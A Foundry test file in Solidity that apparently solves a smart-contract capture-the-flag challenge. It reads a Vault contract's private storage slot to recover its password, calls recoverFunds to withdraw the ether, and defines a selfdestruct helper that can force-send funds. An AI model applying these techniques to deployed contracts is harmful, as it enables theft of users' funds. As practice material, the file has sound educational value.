// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../src/Vault.sol";


interface CheatCodes {
        function record() external;
        function load(address account, bytes32 slot) external returns (bytes32);
}

contract SelfDestruct {
     receive() external payable {} // added for the contract to directly receive funds
    
     function close(address receiver) public {
        selfdestruct(payable(receiver));
     }
   } 


contract VaultTest is Test {
    Vault public vault;
    SelfDestruct public selfdestructor;
    address public bob;


    function setUp() public {
        vault = new Vault{value: 0.0001 ether}();
        selfdestructor = new SelfDestruct();
        
    }


    function testFindThePassword() public {

        bob = makeAddr("bob");
        vm.startPrank(bob);
        vm.deal(bob, 10 ether);

        bytes32 secret = vm.load(address(vault), bytes32(uint256(0)));
        vault.recoverFunds{value:0.0001 ether}(uint256(secret));

    }
}

